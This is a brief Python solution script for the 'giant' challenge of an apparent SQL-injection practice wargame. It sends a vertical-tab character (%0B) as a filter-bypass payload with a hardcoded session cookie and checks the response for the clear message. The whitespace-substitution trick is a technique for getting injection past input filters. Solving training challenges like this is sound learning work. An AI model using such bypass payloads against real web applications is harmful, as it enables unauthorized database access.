url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0B"
# the solution to this challenge is quite stupid -> just a vertical tab
import requests
headers= {'Cookie':'PHPSESSID=ssa2diod2kj6rnm5vgnr3b37c5'}
r = requests.get(url, headers=headers).text
if "<h2>GIANT Clear!</h2>" in r:
    print(r)